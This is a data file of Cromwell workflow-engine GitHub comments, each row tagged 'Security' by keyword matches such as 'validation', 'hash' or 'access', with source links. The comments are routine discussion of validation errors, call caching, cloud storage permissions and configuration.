Security,"A current version of Womtool still validates these tasks as OK, so the problem continues to exist in draft-2. Upgrading the tasks to WDL 1.0 causes Womtool validation to fail with messages of varying helpfulness:. ```; version 1.0. task myTask {. input {; File f; }. command {; touch ${f.bam.bai}; }; }; ```; ```; Failed to process task definition 'myTask' (reason 1 of 1):; Failed to process expression 'f.bam.bai' (reason 1 of 1):; No such field 'bam' on type File; ```; ---; ```; version 1.0. task myTask {. input {; File f; }. command {; touch ${f%%.bam.bai}; }; }; ```; ```; Failed to read task definition at line 3 column 6 (reason 1 of 2):; Failed to convert AST node to ExpressionElement (reason 1 of 2):; No attribute 'rhs' found on Ast 'Remainder'. Did you mean: lhs; Failed to read task definition at line 3 column 6 (reason 2 of 2):; Failed to convert AST node to ExpressionElement (reason 2 of 2):; No attribute 'value' found on Ast 'MemberAccess'. Did you mean: member; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2873#issuecomment-439426356:35,validat,validates,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2873#issuecomment-439426356,2,['validat'],"['validates', 'validation']"
Security,A few `HashError` catches and a few extra Event possibilities `when(BackendIsCopyingCachedOutputs)` but mainly this looks good.; Happy to give this a thumb 👍 assuming those are added. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1365/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1365#issuecomment-245036424:7,Hash,HashError,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1365#issuecomment-245036424,1,['Hash'],['HashError']
Security,"A philosophical question, not a leading one - what about having a persistent validation actor instead of creating them per-validation?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195387043:77,validat,validation,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195387043,2,['validat'],['validation']
Security,AccessDenied for the raw log. I can't see anything attempting to compile CWL in the cooked log. `src/bin/travis/test.sh` is shown as running for 0.01 seconds. 😕,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2788#issuecomment-339511828:0,Access,AccessDenied,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2788#issuecomment-339511828,1,['Access'],['AccessDenied']
Security,Actually ValidateActor only is ever called as a PerRequest.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134228130:9,Validat,ValidateActor,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134228130,1,['Validat'],['ValidateActor']
Security,"Actually if that's true, then I think this is related to #589. @yfarjoun This is assuming that you were submitting with swagger (vs curl in the other issue) and that the project the cromwell server you were using was not the same as broad-gp-gotc-pilot (so it didn't have access to those input files).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209937270:272,access,access,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209937270,1,['access'],['access']
Security,Actually the link I posted (also it's one of the key examples in the Akka docs) might not be so useful as it looks like a lot of the places we're using ConfigFactory.load don't have access to the main actor system,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141:182,access,access,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141,1,['access'],['access']
Security,"Actually, the main problem is that the error is so cryptic one cannot tell; that a file is causing the problem, nor which file it is, even if one had; an inkling that it's a missing file problem. so I have to resort to divide; and conquer in order to identify the missing file...and that's a pain. On Sun, Jul 10, 2016 at 10:08 PM, Jeff Gentry notifications@github.com; wrote:. > The former. He was looking for a backend-aware validation type behavior; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231627459,; > or mute the thread; > https://github.com/notifications/unsubscribe/ACnk0hYeQnaJcsNEVJlnxrz9-tA880TLks5qUaWXgaJpZM4JHehH; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231711585:427,validat,validation,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231711585,1,['validat'],['validation']
Security,"Adding on to this PR... a third (!) variant that is more recent [(Slack link)](https://broadinstitute.slack.com/archives/CBJJ7U293/p1709148881267919) and ended up being an array issue. I think we understand the pattern at this point so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:509,secur,secure-,509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174,2,['secur'],['secure-']
Security,"Additional info since the time this issue was filed: Alibaba's [Batch Compute service (BCS) is now available in the US](https://www.alibabacloud.com/help/doc-detail/61360.htm?spm=a2c63.l28256.a3.23.194f25719KjP66). This helps test Cromwell-in-the-US-using-DockerHub, but for CN users the above issues still need to be addressed, including figuring out a way for to check hashes from OSS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3518#issuecomment-399762138:371,hash,hashes,371,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3518#issuecomment-399762138,1,['hash'],['hashes']
Security,"After discussing with @abaumann and @geoffjentry, we are going to plan this for Cromwell 27, our first release of Q4 (April-or-so). Once this is complete, the A-Team will be able to use the Docker Hash library for their own features.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2062#issuecomment-285791090:197,Hash,Hash,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2062#issuecomment-285791090,1,['Hash'],['Hash']
Security,"After discussion with @ruchim, the output of a successful validation will be `Success!`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4040#issuecomment-444250930:58,validat,validation,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4040#issuecomment-444250930,1,['validat'],['validation']
Security,"Ah yes, let's just claim we fixed one bug then 😄 ; My take; use, modify, or discard as desired:; > Fixed a bug that could cause workflows to fail unexpectedly with the error `413 Request Entity Too Large` when accessing Google Cloud Storage.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600:210,access,accessing,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600,1,['access'],['accessing']
Security,"Ah, I had `hasing-strategy` instead of `hashing-strategy` in my config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861:40,hash,hashing-strategy,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861,1,['hash'],['hashing-strategy']
Security,"Ah, I see. Just a guess, but are you sure your S3 URLs (or more likely your S3 bucket in the configuration file) are in the right format? `s3://s3.amazonaws.com/concr-genomics-results/cromwell-execution/wf_hello/b7e4cdce-ff14-4509-aec3-b226ed31043c/call-hello/hello-rc.txt` doesn't look valid to me. It should be more like `s3://concr-genomics-results`. Alternatively, maybe the AWS Batch role doesn't have read access to the S3 bucket? The Cromwell server and the Batch instances are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016934:412,access,access,412,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016934,1,['access'],['access']
Security,"Ahh I think I see what you mean. I don't need the ""-l labels.json"" but need to create an actual Label in the GCP account that has the following key/value:. my-private-network: xxx; my-private-subnetwork: yyy. I don't have access to create the labels but will have someone do this and try again. Let me know if I am still missing something. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905066699:222,access,access,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905066699,1,['access'],['access']
Security,Allows for removal of dependency on backend in the various *logs and metadata endpoints. Be careful with how this impacts hashing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/430#issuecomment-181537885:122,hash,hashing,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/430#issuecomment-181537885,1,['hash'],['hashing']
Security,"Alright, would you prefer to expose it as a workflow (or Cromwell) option? Something like `monitoring_image` and if it's not defined, then the action is skipped. This way, one can also use an alternative image with their custom logic (incl. other monitoring APIs).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451511789:29,expose,expose,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451511789,1,['expose'],['expose']
Security,"Also I just compared two of the workflow runs:; ```; {; ""callA"": {; ""executionStatus"": ""Done"",; ""allowResultReuse"": false,; ""callFqn"": ""Panel_BWA_GATK4_Samtools_Var_Annotate_Split.BwaMem"",; ""jobIndex"": 0,; ""workflowId"": ""X""; },; ""callB"": {; ""executionStatus"": ""Done"",; ""allowResultReuse"": true,; ""callFqn"": ""Panel_BWA_GATK4_Samtools_Var_Annotate_Split.BwaMem"",; ""jobIndex"": 0,; ""workflowId"": ""Y""; },; ""hashDifferential"": []; }; ```. ???? But yet no data reuse.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457367934:402,hash,hashDifferential,402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457367934,1,['hash'],['hashDifferential']
Security,"Also the following WDL:; ```; version 1.0. workflow main {; }. task main {; command <<<; echo ~{if 0 < 0.0 then ""yes"" else ""no""}; >>>; }; ```; gives similarly inexplicable error messages (with Cromwell 85):; ```; $ java -jar womtool-85.jar validate main.wdl ; ERROR: Unexpected symbol (line 8, col 21) when parsing 'e'. Expected identifier, got ""0"". echo ~{if 0 < 0.0 then ""yes"" else ""no""}; ^. $e = $e <=> :dot :identifier -> MemberAccess( value=$0, member=$2 ); ```; It almost seems like Cromwell does not like the `0.0` representation of `0` within the `command <<< ... >>>` section of a task",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-1599327981:240,validat,validate,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-1599327981,1,['validat'],['validate']
Security,"Also, directories do not seem to work as workflow outputs. Even if the option:; ```; ""final_workflow_outputs_dir"": ""/file/path/output/"",; ```; Is active, `Directory` outputs are not copied to the final output directory. This example to reproduce the issue:; ```; $ echo 'version development. workflow main {; call main { input: s = ""f"" }; output { Directory d = main.d }; }. task main {; input {; String s; }. command <<<; set -euo pipefail; mkdir d; touch ""d/~{s}""; >>>. output {; Directory d = ""d""; }. runtime {; docker: ""debian:stable-slim""; }; }' > /tmp/main.wdl. $ echo '{; ""final_workflow_outputs_dir"": ""/tmp/outputs""; }' > /tmp/options.json. $ java -jar cromwell-69.jar run /tmp/main.wdl -o /tmp/options.json; ... $ ls /tmp/outputs/; ls: cannot access '/tmp/outputs/': No such file or directory; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095:752,access,access,752,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095,1,['access'],['access']
Security,"Also, if possible, run something in JES beforehand, then run the liquibase update over the existing data and check the /metadata and /timing can still be accessed for the preexisting tasks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-181437112:154,access,accessed,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-181437112,1,['access'],['accessed']
Security,"Also, on this topic, I don't know much about it but Java has a SecurityManager and Security policies which might (?) be able to restrict to which part of the filesystem cromwell would be able to read from ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461557:63,Secur,SecurityManager,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461557,2,['Secur'],"['Security', 'SecurityManager']"
Security,"Although now that I've said that I know that we *do* have a use case where something like this is being requested. They want a typed set of key/value pairs, but the thing that they really want is to be able to define some boundaries (e.g. ""Foo"" is a number between 1 and 10) and to have the static analysis fail to validate the workflow if one of these are a workflow input and the values are wrong. Now that I type that out, having refinement types in WDL seems like a bad path to be going down. I should verify that's *really* what they want or if I read too much into an example they gave.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330315059:315,validat,validate,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330315059,1,['validat'],['validate']
Security,"Among other warts labeled as ""TODO: PBE:"", there are now two directories serving the package `cromwell.service`:; - [`services/src/main/scala/cromwell/services`](https://github.com/broadinstitute/cromwell/tree/ks_jes_return_of_the_metadata/services/src/main/scala/cromwell/services); - [`. engine/src/main/scala/cromwell/services`](https://github.com/broadinstitute/cromwell/tree/ks_jes_return_of_the_metadata/engine/src/main/scala/cromwell/services). The latter directory are services that still access the engine. Some engineering/refactoring will be needed if we want them moved to the ""services"" sub-project, but I wasn't sure where to draw the line on changes for this PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/883#issuecomment-221376763:497,access,access,497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/883#issuecomment-221376763,1,['access'],['access']
Security,"Another example of a workflow complete failure possibly due to grabbing the hash from google. Workflow 0c7da038-172a-4081-8850-c87fec05f4c1. ```; 2016-04-26 20:52:05,279 cromwell-system-akka.actor.default-dispatcher-28 ERROR - WorkflowActor [UUID(0c7da038)]: Completion work failed for call HaplotypeCaller:46.; com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:76,hash,hash,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['hash'],['hash']
Security,Another few thoughts to the person who picks this up -> this bug likely also exists on whatever initial validation is being done for CWL files as they can also be json but presumably are being run through a yaml parser,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379232557:104,validat,validation,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379232557,1,['validat'],['validation']
Security,"Anyone have a concrete solution to this, we are also getting the permission denied error with our aws batch setup. We have even included chmod 777 in the cloud init script to ensure that directory is accessible.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-531922228:200,access,accessible,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-531922228,1,['access'],['accessible']
Security,"Apropos: http://blog.threatstack.com/useful-scalac-options-for-better-scala-development-part-1. Although as @mcovarr pointed out, IntelliJ does a good job of flagging this stuff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1282#issuecomment-239239863:21,threat,threatstack,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1282#issuecomment-239239863,1,['threat'],['threatstack']
Security,"Are any of the inputs you're using located in a bucket with requester pays turned on ?; It is also recommended to set the `project` key in your `gcs` filesystem to the google project you want requester pays bucket accesses to be billed to.; e.g:; ```; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; project = ""bioinfo-XXXXXXX""; }; ```; For both the engine and backend `filesystems.gcs` stanza.; More information [here](https://cromwell.readthedocs.io/en/develop/filesystems/GoogleCloudStorage/#requester-pays)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-434809921:214,access,accesses,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-434809921,1,['access'],['accesses']
Security,"As a **user accessing CaaS**, I want **to query a Collection of workflows**, so that I can **view the status of many workflows at once and get the results quickly**.; - Effort: **Medium**; - Risk: **Small to Medium**; - Business value: **Medium to Large**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212:12,access,accessing,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212,1,['access'],['accessing']
Security,"As a **user of all types**, I want **to read documentation about how to access logs**, so that I can **debug my issues, whether they are within the workflow or outside of it**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087:72,access,access,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087,1,['access'],['access']
Security,"As a **user running the same workflows repeatedly**, I want **Cromwell to hash the outputs of my workflows**, so that **I can safely call cache on my outputs and I don't have to worry if they changed**.; - effort: Small to medium ; - risk: Small ; - business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054:74,hash,hash,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054,1,['hash'],['hash']
Security,"As a **user running workflows through a hosted Cromwell**, I want **to be able to authenticate and authorize permissions to my workflows**, so that **my labmates and I can view and take action on the workflows for which we have the right permissions**. - Remaining work: adding Collections to the /Query endpoint",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-345318111:82,authenticat,authenticate,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-345318111,2,"['authenticat', 'authoriz']","['authenticate', 'authorize']"
Security,"As a **user running workflows**, I want **Cromwell to split up its docker hashes by registry**, so that **if one registry is slow, that it doesn't affect the performance of the other registries**.; - Effort: Small to medium; - Risk: Small; - Business value: Small to medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399:74,hash,hashes,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399,1,['hash'],['hashes']
Security,"As background, we run cromwell server behind an authenticating proxy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2583#issuecomment-325881488:48,authenticat,authenticating,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2583#issuecomment-325881488,1,['authenticat'],['authenticating']
Security,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:297,password,password,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392,4,"['access', 'password']","['access', 'password']"
Security,"As explained in issue [#4304](https://github.com/broadinstitute/cromwell/issues/4304) now, it seems like the following three roles are required to run Cromwell with the PAPIv2 backend:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (`lifesciences.workflowsRunner`); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (`iam.serviceAccountUser`); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (`storage.objectAdmin`). Rather than the roles `storage.objectCreator` `storage.objectViewer` `genomics.pipelinesRunner` `genomics.admin` `iam.serviceAccountUser` `storage.objects.create` as explained in the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-680282969:264,access,access-control,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-680282969,2,['access'],['access-control']
Security,"As far as I can tell the cromwell server has permission to read from the bucket:. ```; [ec2-user@cromwell-server ~]$ aws s3 cp upload.txt s3://concr-genomics-results; upload: ./upload.txt to s3://concr-genomics-results/upload.txt; [ec2-user@cromwell-server ~]$ aws s3 ls s3://concr-genomics-results; 2018-11-01 10:32:25 0 upload.txt; ```. I also get the same issue when submitting from my workstation, which also has AWS authentication to read and write from the bucket. . Is there another setting I might be missing?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435000768:421,authenticat,authentication,421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435000768,1,['authenticat'],['authentication']
Security,As for; ```; PAPI error code 7. Required 'compute.zones.list' permission for 'projects/xxx'; ```; it sounds like you need to access Google Cloud Console and enable this permission for your project (Cromwell cannot perform this step for you automatically),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872:125,access,access,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872,1,['access'],['access']
Security,"Assigning myself since the MySQL upgrade is the underlying cause. Here is the command sequence I use to create a new local DB for use by a fresh, totally default Cromwell checkout.; ```; docker run --name=mysql1 -p 3306:3306 -d mysql/mysql-server:latest; docker logs mysql1 # copy the auto generated password; docker exec -it mysql1 mysql -uroot -p # paste in the password from the previous stpe; ALTER USER 'root'@'localhost' IDENTIFIED BY '';; CREATE database cromwell_test;; CREATE USER 'root'@'%' IDENTIFIED BY '';; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;; FLUSH PRIVILEGES;; ```; I just validated it still works with recent versions, so it seems my theory about Docker using UTC is correct.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4803#issuecomment-480417841:300,password,password,300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4803#issuecomment-480417841,3,"['password', 'validat']","['password', 'validated']"
Security,Assuming this was reported against prod FC I'll figure out what hash they're currently using and try again with that.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425171488:64,hash,hash,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425171488,1,['hash'],['hash']
Security,"AsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at 